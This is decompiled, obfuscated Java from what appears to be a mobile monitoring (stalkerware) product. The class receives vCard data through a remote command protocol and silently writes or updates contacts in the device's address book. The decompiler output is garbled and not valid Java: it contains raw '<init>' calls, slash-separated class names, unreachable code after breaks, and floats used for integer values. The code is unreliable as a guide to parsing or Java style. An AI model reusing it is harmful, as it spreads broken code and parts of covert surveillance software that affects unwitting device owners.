package com.vvt.addressbookmanager;

import a_vcard.android.content.ContentValues;
import a_vcard.android.syncml.pim.PropertyNode;
import a_vcard.android.syncml.pim.VDataBuilder;
import a_vcard.android.syncml.pim.VNode;
import a_vcard.android.syncml.pim.vcard.VCardException;
import a_vcard.android.syncml.pim.vcard.VCardParser;
import android.content.ContentResolver;
import android.content.Context;
import android.telephony.PhoneNumberUtils;
import com.vvt.addressbookmanager.a.c;
import com.vvt.io.p;
import com.vvt.phoenix.prot.command.e;
import com.vvt.phoenix.prot.event.s;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

public class f
{
  private static final boolean a = d.a;
  private static final boolean b = d.e;
  private Context c;
  private com.vvt.addressbookmanager.c.a d;
  private String e;
  
  private com.vvt.addressbookmanager.a.a a(VNode paramVNode, long paramLong)
  {
    int i = 0;
    float f1 = 0.0F;
    Object localObject1 = null;
    int i2 = 0;
    float f2 = 0.0F;
    Object localObject2 = null;
    com.vvt.addressbookmanager.a.a locala = new com/vvt/addressbookmanager/a/a;
    locala.<init>();
    Iterator localIterator = paramVNode.propList.iterator();
    int i3 = 0;
    float f3 = 0.0F;
    int i4 = 0;
    com.vvt.addressbookmanager.a.d locald = null;
    float f4 = 0.0F;
    do
    {
      i2 = localIterator.hasNext();
      if (i2 == 0) {
        break;
      }
      localObject2 = (PropertyNode)localIterator.next();
      localObject1 = ((PropertyNode)localObject2).propName;
      localObject3 = ((PropertyNode)localObject2).propValue;
      i6 = com.vvt.ag.b.c((String)localObject3);
    } while (i6 != 0);
    locala.a(paramLong);
    Object localObject3 = "VERSION";
    int i6 = ((String)localObject1).equals(localObject3);
    if (i6 != 0)
    {
      i2 = i3;
      f2 = f3;
      i = i4;
      f1 = f4;
    }
    float f5;
    for (;;)
    {
      i3 = i2;
      f3 = f2;
      i4 = i;
      f4 = f1;
      break;
      localObject3 = "FN";
      i6 = ((String)localObject1).equals(localObject3);
      if (i6 != 0)
      {
        localObject2 = ((PropertyNode)localObject2).propValue;
        locala.d((String)localObject2);
        i2 = i3;
        f2 = f3;
        i = i4;
        f1 = f4;
      }
      else
      {
        localObject3 = "NAME";
        i6 = ((String)localObject1).equals(localObject3);
        if (i6 != 0)
        {
          localObject3 = locala.e();
          if (localObject3 == null)
          {
            localObject2 = ((PropertyNode)localObject2).propValue;
            locala.d((String)localObject2);
            i2 = i3;
            f2 = f3;
            i = i4;
            f1 = f4;
            continue;
          }
        }
        localObject3 = "N";
        i6 = ((String)localObject1).equals(localObject3);
        if (i6 == 0) {
          break label445;
        }
        localObject1 = a(((PropertyNode)localObject2).propValue_vector, 0);
        localObject2 = ((PropertyNode)localObject2).propValue_vector;
        f5 = 0.0F;
        localObject3 = null;
        localObject2 = b((List)localObject2, 0);
        i6 = a;
        if (i6 != 0) {}
        i6 = a;
        if (i6 != 0) {}
        localObject3 = com.vvt.ag.b.b((String)localObject2);
        locala.b((String)localObject3);
        localObject3 = com.vvt.ag.b.b((String)localObject1);
        locala.a((String)localObject3);
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
        localObject3 = " ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject2 = (String)localObject2;
        locala.d((String)localObject2);
        i2 = i3;
        f2 = f3;
        i = i4;
        f1 = f4;
      }
    }
    label445:
    localObject3 = "PHOTO";
    i6 = ((String)localObject1).equals(localObject3);
    if (i6 != 0)
    {
      localObject1 = ((PropertyNode)localObject2).paramMap;
      localObject3 = "VALUE";
      localObject1 = ((ContentValues)localObject1).getAsString((String)localObject3);
      if (localObject1 != null)
      {
        localObject3 = "URL";
        i = ((String)localObject1).equals(localObject3);
        if (i == 0) {}
      }
      for (;;)
      {
        i2 = i3;
        f2 = f3;
        i = i4;
        f1 = f4;
        break;
        localObject2 = ((PropertyNode)localObject2).propValue_bytes;
        locala.a((byte[])localObject2);
      }
    }
    localObject3 = "EMAIL";
    i6 = ((String)localObject1).equals(localObject3);
    Object localObject4;
    label600:
    int k;
    Object localObject5;
    boolean bool2;
    if (i6 != 0)
    {
      int j = -1;
      f1 = 0.0F / 0.0F;
      localObject3 = ((PropertyNode)localObject2).paramMap_TYPE;
      localObject4 = ((Set)localObject3).iterator();
      i6 = i3;
      f5 = f3;
      i3 = j;
      f3 = f1;
      k = ((Iterator)localObject4).hasNext();
      if (k != 0)
      {
        localObject1 = (String)((Iterator)localObject4).next();
        localObject5 = "PREF";
        bool2 = ((String)localObject1).equals(localObject5);
        if ((bool2) && (i6 == 0))
        {
          i6 = 1;
          f5 = Float.MIN_VALUE;
          k = i3;
          f1 = f3;
          i3 = i6;
          f3 = f5;
        }
      }
    }
    for (;;)
    {
      i6 = i3;
      f5 = f3;
      i3 = k;
      f3 = f1;
      break label600;
      localObject5 = "HOME";
      bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject5);
      if (bool2)
      {
        k = 1;
        f1 = Float.MIN_VALUE;
        i3 = i6;
        f3 = f5;
      }
      else
      {
        localObject5 = "WORK";
        bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject5);
        int m;
        if (bool2)
        {
          m = 2;
          f1 = 2.8E-45F;
          i3 = i6;
          f3 = f5;
        }
        else
        {
          localObject5 = "CELL";
          bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject5);
          if (bool2)
          {
            m = 0;
            localObject1 = null;
            f1 = 0.0F;
            i3 = i6;
            f3 = f5;
          }
          else
          {
            localObject1 = ((String)localObject1).toUpperCase();
            localObject5 = "X-";
            int n = ((String)localObject1).startsWith((String)localObject5);
            if ((n != 0) && (i3 < 0))
            {
              n = 0;
              localObject1 = null;
              f1 = 0.0F;
              i3 = i6;
              f3 = f5;
            }
            else
            {
              label1016:
              int i8;
              if (i3 < 0)
              {
                n = 0;
                localObject1 = null;
                f1 = 0.0F;
                i3 = i6;
                f3 = f5;
                continue;
                if (i3 < 0)
                {
                  i3 = 3;
                  f3 = 4.2E-45F;
                }
                localObject1 = new com/vvt/addressbookmanager/a/c;
                ((c)localObject1).<init>();
                localObject2 = com.vvt.ag.b.b(((PropertyNode)localObject2).propValue);
                ((c)localObject1).a((String)localObject2);
                ((c)localObject1).a(i3);
                locala.a((com.vvt.addressbookmanager.a.b)localObject1);
                i2 = i6;
                f2 = f5;
                n = i4;
                f1 = f4;
                break;
                localObject3 = "TEL";
                i6 = ((String)localObject1).equals(localObject3);
                int i7;
                float f6;
                String str;
                boolean bool3;
                int i10;
                if (i6 != 0)
                {
                  i7 = -1;
                  f5 = 0.0F / 0.0F;
                  n = 0;
                  f1 = 0.0F;
                  localObject1 = null;
                  localObject4 = ((PropertyNode)localObject2).paramMap_TYPE;
                  localObject5 = ((Set)localObject4).iterator();
                  int i9 = i4;
                  f6 = f4;
                  i4 = 0;
                  locald = null;
                  f4 = 0.0F;
                  n = ((Iterator)localObject5).hasNext();
                  if (n != 0)
                  {
                    localObject1 = (String)((Iterator)localObject5).next();
                    str = "PREF";
                    bool3 = ((String)localObject1).equals(str);
                    if ((bool3) && (i9 == 0))
                    {
                      i10 = 1;
                      f6 = Float.MIN_VALUE;
                      n = i4;
                      f1 = f4;
                      i4 = i7;
                      f4 = f5;
                      i7 = i10;
                      f5 = f6;
                    }
                  }
                }
                for (;;)
                {
                  i10 = i7;
                  f6 = f5;
                  i7 = i4;
                  f5 = f4;
                  i4 = n;
                  f4 = f1;
                  break label1016;
                  str = "HOME";
                  bool3 = ((String)localObject1).equalsIgnoreCase(str);
                  if (bool3)
                  {
                    n = i4;
                    f1 = f4;
                    i4 = 1;
                    f4 = Float.MIN_VALUE;
                    i7 = i10;
                    f5 = f6;
                  }
                  else
                  {
                    str = "WORK";
                    bool3 = ((String)localObject1).equalsIgnoreCase(str);
                    if (bool3)
                    {
                      n = i4;
                      f1 = f4;
                      i4 = 3;
                      f4 = 4.2E-45F;
                      i7 = i10;
                      f5 = f6;
                    }
                    else
                    {
                      str = "CELL";
                      bool3 = ((String)localObject1).equalsIgnoreCase(str);
                      if (bool3)
                      {
                        n = i4;
                        f1 = f4;
                        i4 = 2;
                        f4 = 2.8E-45F;
                        i7 = i10;
                        f5 = f6;
                      }
                      else
                      {
                        str = "PAGER";
                        bool3 = ((String)localObject1).equalsIgnoreCase(str);
                        if (bool3)
                        {
                          n = i4;
                          f1 = f4;
                          i4 = 6;
                          f4 = 8.4E-45F;
                          i7 = i10;
                          f5 = f6;
                        }
                        else
                        {
                          str = "FAX";
                          bool3 = ((String)localObject1).equalsIgnoreCase(str);
                          if (bool3)
                          {
                            n = 1;
                            f1 = Float.MIN_VALUE;
                            i4 = i7;
                            f4 = f5;
                            i7 = i10;
                            f5 = f6;
                          }
                          else
                          {
                            str = "VOICE";
                            bool3 = ((String)localObject1).equalsIgnoreCase(str);
                            if (!bool3)
                            {
                              str = "MSG";
                              bool3 = ((String)localObject1).equalsIgnoreCase(str);
                              if (!bool3) {}
                            }
                            else
                            {
                              localObject3 = null;
                              n = i4;
                              f1 = f4;
                              i4 = 0;
                              locald = null;
                              f4 = 0.0F;
                              i7 = i10;
                              f5 = f6;
                              continue;
                            }
                            localObject1 = ((String)localObject1).toUpperCase();
                            str = "X-";
                            n = ((String)localObject1).startsWith(str);
                            if ((n != 0) && (i7 < 0))
                            {
                              localObject3 = null;
                              n = i4;
                              f1 = f4;
                              i4 = 0;
                              locald = null;
                              f4 = 0.0F;
                              i7 = i10;
                              f5 = f6;
                            }
                            else
                            {
                              label1625:
                              int i5;
                              if (i7 < 0)
                              {
                                localObject3 = null;
                                n = i4;
                                f1 = f4;
                                i4 = 0;
                                locald = null;
                                f4 = 0.0F;
                                i7 = i10;
                                f5 = f6;
                                continue;
                                if (i7 < 0) {
                                  n = 1;
                                }
                                for (f1 = Float.MIN_VALUE;; f1 = f5)
                                {
                                  int i1;
                                  if (i4 != 0)
                                  {
                                    i4 = 1;
                                    f4 = Float.MIN_VALUE;
                                    if (n != i4) {
                                      break label1625;
                                    }
                                    i1 = 5;
                                    f1 = 7.0E-45F;
                                  }
                                  for (;;)
                                  {
                                    locald = new com/vvt/addressbookmanager/a/d;
                                    locald.<init>();
                                    localObject2 = com.vvt.ag.b.b(((PropertyNode)localObject2).propValue);
                                    i8 = com.vvt.ag.b.a((String)localObject2);
                                    if (i8 == 0) {
                                      localObject2 = PhoneNumberUtils.formatNumber((String)localObject2);
                                    }
                                    locald.a((String)localObject2);
                                    locald.a(i1);
                                    locala.a(locald);
                                    i2 = i3;
                                    f2 = f3;
                                    i1 = i10;
                                    f1 = f6;
                                    break;
                                    i5 = 3;
                                    f4 = 4.2E-45F;
                                    if (i1 == i5)
                                    {
                                      i1 = 4;
                                      f1 = 5.6E-45F;
                                    }
                                  }
                                  localObject3 = "NOTE";
                                  bool1 = ((String)localObject1).equals(localObject3);
                                  if (bool1)
                                  {
                                    localObject2 = ((PropertyNode)localObject2).propValue;
                                    locala.c((String)localObject2);
                                  }
                                  i2 = i3;
                                  f2 = f3;
                                  bool1 = i5;
                                  f1 = f4;
                                  break;
                                  return locala;
                                  bool1 = i8;
                                }
                              }
                              else
                              {
                                bool1 = i5;
                                f1 = f4;
                                i5 = i8;
                                f4 = f5;
                                i8 = i10;
                                f5 = f6;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              boolean bool1 = i3;
              f1 = f3;
              i3 = i8;
              f3 = f5;
            }
          }
        }
      }
    }
  }
  
  private static String a(List paramList, int paramInt)
  {
    int i = 3;
    int j = 0;
    int k = 1;
    int m = paramList.size();
    StringBuilder localStringBuilder;
    String str;
    if (m > k)
    {
      localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      if (m <= i) {
        break label189;
      }
      str = (String)paramList.get(i);
      m = str.length();
      if (m <= 0) {
        break label189;
      }
      str = (String)paramList.get(i);
      localStringBuilder.append(str);
    }
    label189:
    for (i = 0;; i = k)
    {
      if (paramInt == k)
      {
        str = (String)paramList.get(0);
        j = str.length();
        if (j > 0)
        {
          if (i == 0)
          {
            i = 32;
            localStringBuilder.append(i);
          }
          localStringBuilder.append(str);
        }
        str = localStringBuilder.toString();
      }
      for (;;)
      {
        return str;
        str = (String)paramList.get(k);
        break;
        if (m == k) {
          str = (String)paramList.get(0);
        } else {
          str = "";
        }
      }
    }
  }
  
  private List a(byte[] paramArrayOfByte)
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    bool1 = false;
    str = null;
    for (;;)
    {
      try
      {
        str = b(paramArrayOfByte);
        localVCardParser = new a_vcard/android/syncml/pim/vcard/VCardParser;
        localVCardParser.<init>();
        localVDataBuilder = new a_vcard/android/syncml/pim/VDataBuilder;
        localVDataBuilder.<init>();
        localObject3 = new java/io/BufferedReader;
        localObject4 = new java/io/InputStreamReader;
        Object localObject5 = new java/io/FileInputStream;
        ((FileInputStream)localObject5).<init>(str);
        Object localObject6 = "UTF-8";
        ((InputStreamReader)localObject4).<init>((InputStream)localObject5, (String)localObject6);
        ((BufferedReader)localObject3).<init>((Reader)localObject4);
        localObject4 = "";
        localObject5 = ((BufferedReader)localObject3).readLine();
        if (localObject5 != null)
        {
          localObject6 = new java/lang/StringBuilder;
          ((StringBuilder)localObject6).<init>();
          localObject4 = ((StringBuilder)localObject6).append((String)localObject4);
          localObject4 = ((StringBuilder)localObject4).append((String)localObject5);
          localObject5 = "\n";
          localObject4 = ((StringBuilder)localObject4).append((String)localObject5);
          localObject4 = ((StringBuilder)localObject4).toString();
          continue;
        }
        ((BufferedReader)localObject3).close();
        boolean bool2 = a;
        if (bool2) {}
        bool2 = com.vvt.ag.b.a((String)localObject4);
        if (!bool2) {
          continue;
        }
        bool3 = b;
        if (bool3) {}
        localObject4 = new java/io/File;
        ((File)localObject4).<init>(str);
        bool1 = ((File)localObject4).exists();
        if (!bool1) {
          continue;
        }
      }
      catch (Exception localException)
      {
        VCardParser localVCardParser;
        VDataBuilder localVDataBuilder;
        Object localObject3;
        Object localObject4;
        File localFile1;
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        localFile2 = new java/io/File;
        localFile2.<init>(str);
        bool1 = localFile2.exists();
        if (!bool1) {
          continue;
        }
        continue;
      }
      finally
      {
        File localFile2 = new java/io/File;
        localFile2.<init>(str);
        bool1 = localFile2.exists();
        if (!bool1) {
          continue;
        }
        localFile2.delete();
      }
      ((File)localObject4).delete();
      return (List)localObject1;
      localObject3 = "UTF-8";
      try
      {
        bool3 = localVCardParser.parse((String)localObject4, (String)localObject3, localVDataBuilder);
        if (bool3) {
          continue;
        }
        bool3 = b;
        if (bool3) {}
        localObject4 = new java/io/File;
        ((File)localObject4).<init>(str);
        bool1 = ((File)localObject4).exists();
        if (!bool1) {
          continue;
        }
      }
      catch (VCardException localVCardException)
      {
        bool3 = b;
        if (bool3) {}
        localFile1 = new java/io/File;
        localFile1.<init>(str);
        bool1 = localFile1.exists();
      }
      if (bool1)
      {
        continue;
        localObject1 = localVDataBuilder.vNodeList;
        localFile1 = new java/io/File;
        localFile1.<init>(str);
        bool1 = localFile1.exists();
        if (!bool1) {}
      }
    }
  }
  
  private static String b(List paramList, int paramInt)
  {
    int i = 4;
    int j = 0;
    int k = 1;
    int m = paramList.size();
    StringBuilder localStringBuilder;
    String str;
    if (m > k)
    {
      localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      if (paramInt == k)
      {
        str = (String)paramList.get(k);
        int n = str.length();
        if (n <= 0) {
          break label191;
        }
        localStringBuilder.append(str);
      }
    }
    for (;;)
    {
      if (m > i)
      {
        str = (String)paramList.get(i);
        int i1 = str.length();
        if (i1 > 0)
        {
          if (j == 0)
          {
            i1 = 32;
            localStringBuilder.append(i1);
          }
          str = (String)paramList.get(i);
          localStringBuilder.append(str);
        }
      }
      str = localStringBuilder.toString();
      for (;;)
      {
        return str;
        str = (String)paramList.get(0);
        break;
        if (m == k) {
          str = (String)paramList.get(0);
        } else {
          str = "";
        }
      }
      label191:
      j = k;
    }
  }
  
  private String b(byte[] paramArrayOfByte)
  {
    String str = p.a(this.e, "VCardTemp.vc");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (bool)
    {
      localFile = new java/io/File;
      localFile.<init>(str);
      localFile.delete();
    }
    localFile = new java/io/File;
    localFile.<init>(str);
    FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
    localFileOutputStream.<init>(localFile);
    localFileOutputStream.write(paramArrayOfByte);
    localFileOutputStream.close();
    return str;
  }
  
  public void a(com.vvt.addressbookmanager.c.a parama, Context paramContext, String paramString)
  {
    this.d = parama;
    this.c = paramContext;
    this.e = paramString;
  }
  
  public void a(e parame)
  {
    int i = 1;
    int j = 2;
    boolean bool1 = a;
    if (bool1) {}
    do
    {
      bool1 = parame.a();
      if (!bool1) {
        break;
      }
      bool1 = a;
      if (bool1) {}
      localObject1 = (s)parame.b();
    } while (localObject1 == null);
    long l1 = ((s)localObject1).a();
    Object localObject2 = ((s)localObject1).b();
    long l2 = Long.parseLong((String)localObject2);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    Object localObject1 = ((s)localObject1).l();
    localObject1 = a((byte[])localObject1);
    Iterator localIterator = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (VNode)localIterator.next();
      localObject2 = a((VNode)localObject1, l1);
      bool1 = a;
      if (bool1) {}
      localObject1 = this.c.getContentResolver();
      bool1 = com.vvt.addressbookmanager.delivery.b.a((com.vvt.addressbookmanager.a.a)localObject2, (ContentResolver)localObject1);
      boolean bool3 = a;
      if ((!bool3) || (bool1))
      {
        long l3 = 0L;
        bool1 = l1 < l3;
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = this.d;
          bool1 = ((com.vvt.addressbookmanager.c.a)localObject1).a(l1);
          if (bool1)
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = this.d;
            ((com.vvt.addressbookmanager.c.a)localObject1).a(l1, (com.vvt.addressbookmanager.a.a)localObject2, j);
          }
          else
          {
            localObject1 = this.d;
            l3 = ((com.vvt.addressbookmanager.a.a)localObject2).d();
            ((com.vvt.addressbookmanager.c.a)localObject1).a((com.vvt.addressbookmanager.a.a)localObject2, j, i, l3);
            bool1 = a;
            if (!bool1) {}
          }
        }
        else
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = this.d;
          bool1 = ((com.vvt.addressbookmanager.c.a)localObject1).b(l2);
          if (bool1)
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = this.d;
            ((com.vvt.addressbookmanager.c.a)localObject1).b(l2, (com.vvt.addressbookmanager.a.a)localObject2, j);
            bool1 = a;
            if (!bool1) {}
          }
          else
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = this.d;
            l3 = ((com.vvt.addressbookmanager.a.a)localObject2).d();
            ((com.vvt.addressbookmanager.c.a)localObject1).a((com.vvt.addressbookmanager.a.a)localObject2, j, i, l3);
            bool1 = b;
            if (!bool1) {}
          }
        }
      }
      else
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */